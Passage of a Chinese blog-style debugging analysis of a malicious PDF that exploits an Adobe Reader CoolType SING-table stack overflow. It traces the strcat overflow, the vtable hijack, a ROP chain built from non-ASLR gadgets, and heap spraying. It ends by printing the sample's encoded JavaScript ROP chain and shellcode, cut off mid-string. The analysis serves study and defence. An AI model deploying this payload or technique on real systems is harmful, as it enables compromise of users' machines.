Destination是-0x108,所以这里应该就是普通的lea eax,[ebp].text:0803DDA6 50                            push    eax                             ; Destination.text:0803DDA7 C6 45 00 00                   mov     [ebp+108h+Destination], 0.text:0803DDAB E8 48 3D 13 00                call    strcat                          ; 漏洞点</code></pre><h2 id="5-样本分析（阶段一：栈溢出）"><a href="#5-样本分析（阶段一：栈溢出）" class="headerlink" title="5.样本分析（阶段一：栈溢出）"></a>5.样本分析（阶段一：栈溢出）</h2><p>我们首先获取到对应样本，其为一个pdf，当我们打开此pdf会有个任意命令执行的功能，具体呈现出的效果为打开一个计算器，如下：<br><img src="http://imgsrc.baidu.com/forum/pic/item/6609c93d70cf3bc7f8d2ec269400baa1cc112a2d.jpg"></p><p>然后执行他，会出现一个明显的pdf弹框，但不完全，接下来就会出现计算器<br><img src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03e1b7c272913f8794a5c22628.jpg"></p><p>当然也可以是别的命令，这里仅仅是为了体现效果<br>首先我们打开OD，加载Adobe文件下的AcroRd32可执行文件</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c8c771dded3a3e6709c83d5135.jpg"></p><p>然后我们按下F9来运行程序，这样可以用来加载我们需要的库<br>这里我们先配合之前的IDA静态分析的结果，我们利用ctrl + g进行地址跟踪，然后双击十六进制部分进行断点，至于下断点的位置，有以下三个点，</p><ul><li>首先就是我们讲<code>SING</code>表赋值给eax的那个点(0x803dd82)；</li><li>然后就是执行strcat函数的点(0x803ddab)</li><li>最后就是一个关键漏洞点(0x808b308)，这个点我们之后详细介绍</li></ul><p>此时我们使用OD打开的Adobe Reader打开样本Exploit，然后会断到我们的第三个断电处</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c336800fe025f4c510fd8f9a1fb.jpg"></p><p>该指令是执行eax寄存器保存的地址指向的函数，这里我们可以从右上角的Registers窗口看到eax的值，发现他是在栈上的，此时我们右键点击eax，然后选择Follow in Stack，这样我们的栈窗口看到咱们eax中保存的值所指向的地址是0x80833EF,此刻我们返回IDA，查看该地址所在的函数</p><pre><code class="hljs">size_t *__cdecl sub_80833EF(int a1, int a2, void *a3, size_t *a4)&#123;  size_t *result; // eax  switch ( a2 )  &#123;    case 0:      return (size_t *)sub_8083119(a3, *a4);    case 2:      return (size_t *)sub_80830AE(*a4);    case 3:      result = (size_t *)sub_80828ED(*(_DWORD *)(a1 + 4), 0);      *a4 = (size_t)result;      break;    default:      result = a4;      *a4 = 0;      break;  &#125;  return result;&#125;</code></pre><p>观察这里是一个switch选择语句，看别的师傅博客是说明这里是处理SING表的时候会执行的函数，具体情况我们到下面再来讲解<br>接下来我们再次F9，类似于gdb当中的c，这里会到达我们之前下的第一个断点，这条指令会将我们SING表的首地址传入eax，我们F8单步执行到下一条指令来查看以下EAX的值<br><img src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343f388a7ebd613b07ecb8088b0.jpg"><br>此时我们查看eax指向地址的值，首先右键eax，然后选择follow in dump，接着会再二进制窗口显示我们值指向的地址，这里从我们之前了解到的<code>SING</code>表结构会知道uniquename的地址应该是SING表偏移0x10字节的地方，也就是0x035529a0,可以看到样本中uniqueName字段十分长，然后我们单步执行到<code>push eax</code>，这里是将我们的uniqueName字段的地址压栈</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b2de9c82d158ccbf231c95f05cd8bc3eb0354153.jpg"></p><p>然后我们再次F9运行到第二个断点处，这里即将调用strcat函数，可以看到其目的地址已经在栈上了，目的地址也是指向栈上的一个缓冲区地址，此时我们查看一下目前的目的地址附近的值，我们在栈窗口上ctrl+g，然后输入目的地址0x12e468</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f603d830bc8d7c12b31bb151ed7c.jpg"></p><p>然后我们单步F8步过call strcat指令，由于我们没有对uniquename进行长度检查，这就导致了我们现如今会将其全部拷贝到栈上指定的地址，结果如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/00e93901213fb80e5f23411d73d12f2eb838940d.jpg"></p><p>可以看到我们左边uniqueName字段的值已经赋值到右边栈上0x12e4d8这里了，此时我们再来查看之前0x12E6D0,此时可以看到已经被覆盖为我们所伪造的地址了</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9b8d9e2ef61c8701a08bfb3d.jpg"></p><p>此时我们可以看到旁边注释也是很清楚，返回到icucnv36.4A80CB38，此时我们跳转到该地址来查看一下函数是干啥的，以及我们为啥要修改之前的返回地址为他</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a600c338744ebf8ea5d47f59cf9d72a6159a7c8.jpg"></p><p>根据别的师傅的说法，这里是明显的利用ROP绕过DEP保护的手段，但是由于本人太菜不了解，所以下面来科普一下相关知识</p><hr><h3 id="1-GS保护"><a href="#1-GS保护" class="headerlink" title="1.GS保护"></a>1.GS保护</h3><p>类似于linux上的canary,函数执行前存放在返回值与ebp上（低地址），然后当我们程序执行完毕之后会调用检查函数来判断该值是否与之前相同，因此我们此时就不能通过覆盖ret地址进行ROP链构造了，而是修改栈上保存的某一个函数指针来进行利用</p><p>IDA反汇编可以看到函数开始前会有如下指令：</p><pre><code class="hljs">text:0803DCF9                               ; __unwind &#123; // loc_8184A54.text:0803DCF9 55                            push    ebp.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4].text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie.text:0803DD09 33 C5                         xor     eax, ebp</code></pre><p>结束函数的时候有以下判断</p><pre><code class="hljs">.text:0803DEE1 E8 A9 A2 00 00                call    @__security_check_cookie@4      ; __security_check_cookie(x).text:0803DEE1.text:0803DEE6 81 C5 08 01 00 00             add     ebp, 108h.text:0803DEEC C9                            leave.text:0803DEED C3                            retn</code></pre><h3 id="2-DEP-Data-Excution-Prevention-数据执行保护"><a href="#2-DEP-Data-Excution-Prevention-数据执行保护" class="headerlink" title="2.DEP(Data Excution Prevention)数据执行保护"></a>2.DEP(Data Excution Prevention)数据执行保护</h3><p>类似于Linux上的NX，不知道为啥名字这俩起不一样干嘛，搞得我是新知识点了，艹。所以这里我们可以使用ROP来进行栈迁移进行绕过，我们可以再OD上输入指令alt+m来查看内存情况，类似pwndbg中的vmmap，十分方便（这里插一句我个人还是更喜欢gdb，不知道为啥就对Linux的喜爱更甚Windows）</p><h3 id="3-ALSR"><a href="#3-ALSR" class="headerlink" title="3.ALSR"></a>3.ALSR</h3><p>终于来了个名字一样的了，在加载程序的时候不再使用固定的基址加载，支持ASLR的程序在其PE头中会设置<br><code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>标识来说明其支持ASLR。例如，如果 icucnv36.dll 开启了 ASLR，那么同一个代码的地址，可能是 0x4A80CB38，也可能是 0x5A80CB38。由于无法知道准确的地址，所以也就无法跳转到想要执行的代码。我们可以通过下面这个小工具来查看对应库中是否开启了ALSR</p><p><a href="http://www.scriptjunkie.us/files/pefinder.zip">http://www.scriptjunkie.us/files/pefinder.zip</a></p><p>用法如下</p><pre><code class="hljs">dir /b /w /s &quot;C:\Program Files\Adobe\*.dll&quot; | pefinder.exe -</code></pre><p>我们之前将对应0x12E6D0的栈地址指向的即将修改的函数指针改成0x4A80CB38,他位于icucnv36下，我们挑选他不是没有理由，因此我们打开cmd执行上述命令来查看哪里没开ALSR,我们可以找到如下信息：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/63d0f703918fa0ecdc5e47c7639759ee3c6ddb5b.jpg"></p><p>而具体绕过是通过堆喷，我们再之后再来介绍</p><hr><p>我们介绍了几个涉及到的保护知识，接下来再继续分析，我们来说上面所打的第三个断点，我们是如何发现该点的呢，这是通过一步一步调试获取所得，所以上面相当于是提前知道这里用来方便理解<br>这里因为我们要执行恶意代码，运行一次恶意代码会影响后续的工作，因此我们此时先保存个虚拟机快照了再接着调试</p><p>我们F8单步到call CoolType.08001243处，下一个断点，然后再次单步步过<br><img src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffcbbc69c78fc014a90f703ea08.jpg"></p><p>发现并没有出现什么问题，此时我们取消上面打的断点，再接下来单步调试，最后单步我们会到达之前的第三个断点处，如下图:</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d009b3de9c82d15881557a7bc50a19d8bd3e4220.jpg"></p><p>理论上如果你填充大量无关数据，是可以找到这条关键漏洞的地址值的，上面图中我也贴心的给出了eax里面保存的函数指针，这里可以看到接下来就会调用上面的0x4A80CB38的汇编指令了</p><p>这里我们重新来看看，为啥跳转到了这个call [eax]指令，我们首先ctrl + F2来重新启动程序，按照之前的步骤我们步到这里，如下图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16cfd1b8abb6deb48f8d5464e1.jpg"></p><p>此时这条指令<code>call CoolType.08016BDE</code>执行后就会跳转到<code>call [eax]</code>,但这是为什么呢，我们步入进去看看，使用F7，进入该函数后，再此单步调试，直到下面这条指令</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5d455ca3e14da81cb38db3df1.jpg"></p><p>执行该call后会跳到<code>call [eax]</code>,但是这又是为啥呢，因此我们再F7跟进看看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d01373f082025aaf30455c01beedab64024f1a80.jpg"></p><p>可以看到这就是函数内部了，上面重点标记的指令将ecx的值赋给了eax，我们查看ecx</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e7f7a823094c8a786c8175c9b.jpg"></p><p>我们可以跟之前一样右键ecx然后选择follow in dump ，然后左下角二进制会出现相应值，我们发现ecx值所指向的是0x081A601C</p><p>我们可以通过右键二进制窗口，选择long–&gt;address，来方便我们用地址形式来查看内存数据，此时我们跳转到0x81A601C看看这里存放的是什么</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e712a338d4fc389b504ec26aa8.jpg"></p><p>可以发现这里存放的很多函数指针，因此不难判断上面的函数地址这是一个虚表指针，我们可以到IDA中查看该虚表内容</p><pre><code class="hljs">.rdata:081A6004 53 74 72 65 61 6D 48 61 6E 64+aStreamhandler db &#39;StreamHandler&#39;,0     ; DATA XREF: .data:off_821D31C↓o.rdata:081A6012 00 00 00 00 00 00             align 8.rdata:081A6018 2C 87 1E 08                   dd offset ??_R4StreamHandler@@6B@       ; const StreamHandler::`RTTI Complete Object Locator&#39;.rdata:081A601C                               ; const StreamHandler::`vftable&#39;.rdata:081A601C 16 B1 08 08                   ??_7StreamHandler@@6B@ dd offset sub_808B116.rdata:081A601C                                                                       ; DATA XREF: sub_801E529-18↑o.rdata:081A601C                                                                       ; sub_808AC54+11↑o.rdata:081A6020 AA B5 08 08                   dd offset sub_808B5AA.rdata:081A6024 62 99 08 08                   dd offset sub_8089962.rdata:081A6028 8C 95 08 08                   dd offset sub_808958C.rdata:081A602C 91 95 08 08                   dd offset nullsub_41.rdata:081A6030 AA B0 08 08                   dd offset nullsub_47.rdata:081A6034 85 AC 08 08                   dd offset sub_808AC85.rdata:081A6038 C7 95 08 08                   dd offset nullsub_37.rdata:081A603C 95 B0 08 08                   dd offset sub_808B095.rdata:081A6040 07 9E 08 08                   dd offset sub_8089E07.rdata:081A6044 6F 99 08 08                   dd offset sub_808996F.rdata:081A6048 A7 94 08 08                   dd offset sub_80894A7.rdata:081A604C ED 95 08 08                   dd offset sub_80895ED.rdata:081A6050 F2 95 08 08                   dd offset sub_80895F2.rdata:081A6054 C5 B0 08 08                   dd offset sub_808B0C5.rdata:081A6058 FC E4 01 08                   dd offset nullsub_48.rdata:081A605C F9 E4 01 08                   dd offset nullsub_49.rdata:081A6060 FF E4 01 08                   dd offset sub_801E4FF.rdata:081A6064 DA 94 08 08                   dd offset sub_80894DA.rdata:081A6068 F7 95 08 08                   dd offset sub_80895F7.rdata:081A606C F8 E4 01 08                   dd offset nullsub_50.rdata:081A6070 04 E5 01 08                   dd offset sub_801E504.rdata:081A6074 70 B0 08 08                   dd offset sub_808B070.rdata:081A6078 8A AC 08 08                   dd offset sub_808AC8A.rdata:081A607C 2F 99 08 08                   dd offset sub_808992F.rdata:081A6080 5B C3 01 08                   dd offset sub_801C35B.rdata:081A6084 34 99 08 08                   dd offset sub_8089934.rdata:081A6088 9B B5 08 08                   dd offset sub_808B59B.rdata:081A608C 37 99 08 08                   dd offset sub_8089937.rdata:081A6090 69 99 08 08                   dd offset nullsub_46.rdata:081A6094 45 9E 08 08                   dd offset sub_8089E45.rdata:081A6098 54 DC 01 08                   dd offset sub_801DC54.rdata:081A609C 45 DF 01 08                   dd offset sub_801DF45.rdata:081A60A0 F0 D5 01 08                   dd offset sub_801D5F0.rdata:081A60A4 0E C3 01 08                   dd offset sub_801C30E.rdata:081A60A8 3B C3 01 08                   dd offset sub_801C33B.rdata:081A60AC 4B C3 01 08                   dd offset sub_801C34B.rdata:081A60B0 1F 99 08 08                   dd offset sub_808991F.rdata:081A60B4 54 59 50 31 00                aTyp1 db &#39;TYP1&#39;,0                       ; DATA XREF: sub_808B116+275↑o</code></pre><p>可以看到此虚表类型为StreamHandler，应该是处理PDF中流对象的类，然后我们查看IDA中目前正在执行的语句（通过OD来看）</p><pre><code class="hljs">.text:0801BB21 55                            push    ebp.text:0801BB22 8B EC                         mov     ebp, esp.text:0801BB24 FF 75 20                      push    [ebp+arg_18].text:0801BB27 8B 4D 08                      mov     ecx, [ebp+StreamHandler].text:0801BB2A FF 75 1C                      push    [ebp+arg_14].text:0801BB2D 8B 01                         mov     eax, [ecx].text:0801BB2F FF 75 18                      push    [ebp+arg_10].text:0801BB32 FF 05 A0 A6 23 08             inc     dword_823A6A0.text:0801BB38 FF 75 14                      push    [ebp+arg_C].text:0801BB3B FF 75 10                      push    [ebp+arg_8].text:0801BB3E FF 75 0C                      push    [ebp+arg_4].text:0801BB41 FF 10                         call    dword ptr [eax]</code></pre><p>IDA 上面一段代码反汇编情况如下：</p><pre><code class="hljs">int __cdecl sub_801BB21(        int (__thiscall ***StreamHandler)(_DWORD, int, int, int, int, int, int),        int a2,        int a3,        int a4,        int a5,        int a6,        int a7)&#123;  int (__thiscall **v7)(_DWORD, int, int, int, int, int, int); // eax  int result; // eax  v7 = *StreamHandler;  ++dword_823A6A0;  result = (*v7)(StreamHandler, a2, a3, a4, a5, a6, a7);  if ( !(_BYTE)result )    --dword_823A6A0;  return result;&#125;</code></pre><p>可以看到该代码段是传递7个参数，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/94cad1c8a786c91721047ff38c3d70cf3ac757f0.jpg"></p><p>可以看到栈上第一个参数就是之前我们ecx保存的值，该值是一个指向一个虚表指针的地址，也就是我们的StreamHandler对象，该代码逆向的大致含义就是运行虚函数指向的第一个函数，也就是0x0808B116,然后其第一个对象就是StreamHandler,我们可以查看该地址二进制附近的数值</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9d82d158ccbf6c81cd6e0122f93eb13532fa409a.jpg"></p><p>可以看到在当初覆盖值的时候，我们会在此处也覆盖掉一个值，这里也就出现了我们一开始的0x12E6D0,也就是之后call [eax]的eax值，此时我们再次OD F7步入0x808B116,然后单步步过</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fb6a8c5bec28224f4a21a4ddb6.jpg"></p><p>然后到达这条语句，可以看到是将edi + 0x3c地址指向的值赋给了eax，而这个edi保存的是之前StreamHandler对象的首地址，加上0x3c就变成了刚刚我们说里面保存0x12E6D0的值，此时这条指令执行完毕，eax中就是该值了，再然后我们单步，你会发现：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3b87e950352ac65c13bc4bb9bef2b21192138aba.jpg"></p><p>哦我的老天爷，这不是咱们之前打的3号断点嘛，这下我们终于知道了为什么最后call eax会是这个值了，然后我们回到断点处，这里我们会调用0x4A80CB38这个函数，我们按下F7进入该函数查看，至此溢出部分分析完毕</p><h2 id="5-样本分析（阶段二：ROP链）"><a href="#5-样本分析（阶段二：ROP链）" class="headerlink" title="5.样本分析（阶段二：ROP链）"></a>5.样本分析（阶段二：ROP链）</h2><p>接着上面继续分析，我们现在运行到了icucnv36.dll中0x4A80CB38这个地址的函数，我们进入查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fc7e9bf81fafa40f4afb054c.jpg"></p><p>这里我们看到是首先将ebp抬了0x794字节（栈从高到低扩展），然后执行leave，熟悉栈迁移的同学可能十分了解他，它实际上的操作相当于<code>mov esp ebp; pop ebp;</code><br>此时指令执行完毕，栈顶应该指向0x0012E4E0（EBP + 0x794 + 4 &#x3D; 0x12DD48 + 0x794 + 4）,下面发现果真如此，然后栈顶指向的指针就会被我们的retn指令调用</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9fc5922ef61c8701a08bfb75.jpg"></p><p>此时可一看到下一条指令我们是执行 0x4A82A714,我们继续跟进，发现这里是简单的pop出栈上的值到达esp，相当于是再次栈迁移了，这里我们之前构造的0x0C0C0C0C是我们常用的堆喷地址，在后面我们会介绍堆喷的原理，目前程序运行情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd2f88c9ec4c24ab18962b372c.jpg"></p><p>执行后，栈迁移到0x0c0c0c0c</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2cf5e0fe9925bc31609b2d521bdf8db1ca137031.jpg"></p><p>然后继续跟进，发现是将0x4A8A0000弹到ecx上，继续跟进，没什么好说的，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c2cec3fdfc039245b8b3cec5c294a4c27c1e25f1.jpg"></p><p>发现是保存eax到刚刚赋值ecx的地址那儿，也就是0x4A8A0000，然后上面的函数ret过后，会再次从栈上弹出值到eax当中</p><pre><code class="hljs">4A801F90    58              pop eax                           ; &lt;&amp;KERNEL32.CreateFileA&gt;4A801F91    C3              retn4A801F92    33C0            xor eax,eax4A801F94    C3              retn4A801F95 &gt;  8B4C24 04       mov ecx,dword ptr ss:[esp+0x4]    ; icucnv36.4A80B6924A801F99    85C9            test ecx,ecx                      ; icucnv36.4A8A0000</code></pre><p>这里弹出的值是<CreateFileA>的符号值，然后我们进入retn，发现是</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16d2b1b5abb6deb48f8d546481.jpg"></p><p>然后我们就是直接jmp [eax]，也就是直接执行<code>kernel32.CreateFileA</code>这个函数，并且此时我们在栈上也已经构造好了参数如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13090813d99854564e93584b92.jpg"></p><p>此时我们步入这个函数查看内部实现情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d2296323a5e032309f79152d2b7.jpg"></p><p>我们移步到右下角这是咱们解析的参数，这个<code>CreateFileA</code>函数的功能是打开某个文件，如果没这个文件就会创建，其名为<code>iso88591</code>,此时我们使用ctrl + F9来执行到返回，然后查看是否创建出了这个文件，他会被创建在桌面上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f2deb48f8c5494eec5de20d368f5e0fe98257e7f.jpg"></p><p>可以看到我标注的那个文件，确实是<code>iso88591</code>,这里注意如果你windows的隐藏文件夹选项开着那就看不到，记得到控制面板设置一下</p><p>之后我们继续调试，刚刚我们已经返回，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d833c895d143ad4b5cdc690ac7025aafa50f060d.jpg"></p><p>此时eax应该是上面函数的返回值，其为我们刚刚创建的文件句柄，也就是0x33c，然后交换eax和edi，再次步入</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/622762d0f703918f6e9f1300143d269758eec4aa.jpg"></p><p>此时我们会将栈上的8弹给ebx，接着步入</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd5266ac6c12deee18972bd50736b0.jpg"></p><p>可以看到上面的图中我们将edi,也就是之前的文件句柄传给了esp + ebp*2的地址，可以看到ebx为刚刚的8，也就是距离栈顶偏移0x10字节，也就是将0x0c0c0c6c上原来的值0xFFFFFFFF改为文件句柄，也就是0x33c,然后我们ctrl+F9跳转到返回前</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9b8a80aa0ac2d56284356868.jpg"></p><p>此时再将<code>CreateFileMappingA</code>的函数地址弹到eax，然后步入可以发现是直接执行eax保存的函数地址</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b3b7d0a20cf431add9396df30e36acaf2fdd9814.jpg"></p><p>内部执行情况单步步入之后如下，并且可以发现其中的栈上的函数参数,其中第一个参数就是我们刚刚的文件句柄，第三个参数就是传递的保护措施，可以看到也是可执行可读可写的，因此我们就可以传递shellcode复制到此处执行</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688bae39c6ee1c27d1ed31b2412.jpg"></p><p>执行完毕我们使用ctrl + F9,再次跳转到结尾，发现同之前一样，交换eax和edi，也就是我们创建文件映射的句柄给到了edi</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c870112789c2c627f9e2f0608ff2a.jpg"></p><p>然后同之前上面一样的操作，通过布置好的ROP链来执行<code>MapViewOfFile</code>，我直接掠过这里调试，跟上面两个函数一样，没什么好说的</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4610b912c8fcc3ceaaf8e0f9d745d688d43f203b.jpg"></p><p>可以看到上面图片中调用<code>MapViewOfFile</code>函数的参数，调用该函数后，会返回该文件对象在内存当中对应的地址<br>该函数返回后如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd403059bfbe48b87d6267ff9d0.jpg"></p><p>其中eax即为我们文件对象在内存中的地址为0x048D0000 </p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d50735fae6cd7b891d6813494a2442a7d8330ef7.jpg"></p><p>可以看到这块映射区RWE权限均有</p><p>然后我们之后的调试就会将文件内存地址存放在0x4A8A004的地址了，如下图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b506c8bc998c035e5dde6116e87.jpg"></p><p>之后调试我们会在retn的地址存放该0x48D0000,方便我们ROP链返回<br>之后我们以同样的手段执行memcpy函数</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343fa88aeebd613b07ecb8088b0.jpg"></p><p>可以看到其中目的地址是0x048D0000,而我们的0x0c0c0D54存放着我们的恶意代码</p><p>我们使用ctrl + F9来跳到执行函数结束，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/09fa513d269759eeefe94901f7fb43166c22dfbb.jpg"></p><p>可以看到文件对象的内存地址处已经拷贝过去了大量恶意代码，并且retn那儿我们是直接返回到0x048D00这里，也就是这个文件处执行，而因为我们这个文件有RWX权限，所以说咱们可以执行该文件恶意代码。</p><p>因此从ROP链到执行恶意代码，我们分为以下几个步骤：</p><ol><li>利用溢出来构造ROP链，ROP链通过布置不带ALSR的库中gadget来绕过此机制，通过两次栈迁移来到达0x0C0C0C0C,我们通过堆喷在这里构造好栈数据和恶意代码</li><li>调用CreateFileA函数，创建ios88591这个文件</li><li>调用CreateFileMappingA函数，构造该文件在内存中的映射</li><li>调用MapviewOfFile函数，返回该文件映射在内存中的地址，上面三部是为了构造一块可执行可读可写的内存区域</li><li>调用memcpy,来将恶意代码存放到该文件映射当中</li><li>跳转到恶意代码执行</li></ol><h2 id="6-堆喷-Heap-Spray"><a href="#6-堆喷-Heap-Spray" class="headerlink" title="6.堆喷(Heap Spray)"></a>6.堆喷(Heap Spray)</h2><p>我们利用pdf中内嵌的javascript来申请，首先申请个200MB的内存，而我们一般分配内存都是从低地址开始分配，因此大概率0x0c0c0c0c会被包含在其中，而我们这里一般会在前面的部分大量填充0x90，表示NOP指令，也就是雪橇，如果我们ROP到0x0c0c0c0c，就会通过该雪橇滑向我们布置的ROP链上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0df431adcbef760958c9b0556bdda3cc7dd99e3d.jpg"></p><p>我们可以通过PdfStreamDumper来解析pdf文件，从中提取出我们的JavaScript代码，如下：</p><pre><code class="hljs">var shellcode = unescape(&quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot; +&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot; +&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot; +&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot; +&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot; +&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot; +&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot; +&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot; +&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot; +&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot; +&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot; +&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot; +&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot; +&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot; +&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot; +&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot; +&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot; +&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot; +&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot; +&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot; +&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot; +&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot; +&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot; +&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot; +&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot; +&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot; +&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot; +&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot; +&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot; +&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot; +&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot; +&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot; +&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot; +&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot; +&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot; +&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot; +&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot; +&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot; +&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot; +&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot; +&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot; +&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot; +&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot; +&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot; +&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot; 